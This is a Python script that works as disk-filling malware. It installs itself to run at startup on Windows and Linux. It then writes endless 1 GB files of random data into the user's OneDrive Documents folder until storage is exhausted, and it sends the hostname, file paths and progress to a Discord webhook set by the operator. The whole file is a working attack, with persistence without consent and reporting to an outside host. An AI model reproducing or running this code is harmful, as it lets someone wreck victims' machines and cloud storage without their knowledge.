import os
import random
import string
import requests
import socket
import shutil
import time
import sys
import platform
import getpass

# Settings dictionary
settings = {
    "webhook": True,  # Enable/disable Discord webhook notifications
    "webhook_url": "DISCORD-URL",  # Your Discord Webhook URL
    "file_chunk_size_gb": 1,  # Size of each file written (in GB)
    "add_to_startup": True,  # Automatically add the script to system startup
}

def send_discord_notification(message):
    if settings.get("webhook") and settings.get("webhook_url"):
        try:
            payload = {"content": message}
            response = requests.post(settings["webhook_url"], json=payload)
        except Exception:
            pass

def add_to_startup():
    if platform.system() == "Windows":
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        script_path = os.path.abspath(sys.argv[0])
        batch_file_path = os.path.join(startup_dir, ".bat")
        with open(batch_file_path, "w") as batch_file:
            batch_file.write(f'pythonw "{script_path}"\n')
        send_discord_notification(f"**[Windows Startup]** Script added: {batch_file_path}")

    elif platform.system() == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)

        desktop_file_path = os.path.join(autostart_dir, "startup_script.desktop")
        script_path = os.path.abspath(sys.argv[0])
        with open(desktop_file_path, "w") as desktop_file:
            desktop_file.write(f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=StartupScript
Comment=Run this script on system startup
""")
        os.chmod(desktop_file_path, 0o755)
        send_discord_notification(f"**[Linux Startup]** Script added: {desktop_file_path}")
    else:
        send_discord_notification("**[Startup Error]** Unsupported OS. Cannot add script to startup.")

def estimate_time_remaining(folder_path, chunk_size_gb):
    total, used, free = shutil.disk_usage(folder_path)
    chunk_size_bytes = chunk_size_gb * 1024 * 1024 * 1024
    chunks_remaining = free // chunk_size_bytes
    time_per_chunk = 1
    total_time_seconds = chunks_remaining * time_per_chunk
    hours, remainder = divmod(total_time_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return total_time_seconds, f"**Estimated Time Remaining:** {int(hours)}h {int(minutes)}m {int(seconds)}s"

def create_folder_path_manually(folder_path):
    try:
        os.makedirs(folder_path, exist_ok=True)
        send_discord_notification(f"[Folder Created] Path successfully created: {folder_path}")
    except Exception as e:
        send_discord_notification(f"[Folder Error] Failed to create folder: {folder_path}. Error: {e}")

def create_max_size_files_with_notifications(folder_path):
    pc_name = socket.gethostname()
    if not os.path.exists(folder_path):
        create_folder_path_manually(folder_path)
        send_discord_notification(f"[Folder Created by {pc_name}] Path: {folder_path}")

    file_count = 0
    chunk_size_bytes = settings["file_chunk_size_gb"] * 1024 * 1024 * 1024
    estimated_seconds, estimated_time = estimate_time_remaining(folder_path, settings["file_chunk_size_gb"])
    send_discord_notification(f"[File Creation Started] {pc_name} is creating files... {estimated_time}")
    start_time = time.time()

    try:
        while True:
            file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + '.bin'
            file_path = os.path.join(folder_path, file_name)
            bytes_written = 0

            with open(file_path, 'wb') as f:
                while bytes_written < chunk_size_bytes:
                    try:
                        chunk = os.urandom(min(1024 * 1024, chunk_size_bytes - bytes_written))
                        f.write(chunk)
                        bytes_written += len(chunk)
                    except OSError:
                        break

            file_count += 1
            send_discord_notification(f"[File #{file_count} Created] Path: {file_path} Size: {bytes_written / (1024 ** 3):.2f} GB")
            elapsed_time = time.time() - start_time
            if elapsed_time > estimated_seconds:
                estimated_seconds, estimated_time = estimate_time_remaining(folder_path, settings["file_chunk_size_gb"])
                send_discord_notification(f"[Re-estimating Time] {estimated_time}")

    except OSError as e:
        send_discord_notification(f"[Script Error] Stopped due to error on {pc_name}: {e}")
    except KeyboardInterrupt:
        send_discord_notification(f"[Script Stopped Manually] {pc_name} manually stopped the script.")
    finally:
        send_discord_notification(f"[Total Files Created] {pc_name} created {file_count} files.")

if __name__ == "__main__":
    if settings["add_to_startup"]:
        add_to_startup()

    target_folder = f'C:\\Users\\{getpass.getuser()}\\OneDrive\\Documents\\Drive'.strip()
    create_max_size_files_with_notifications(target_folder)

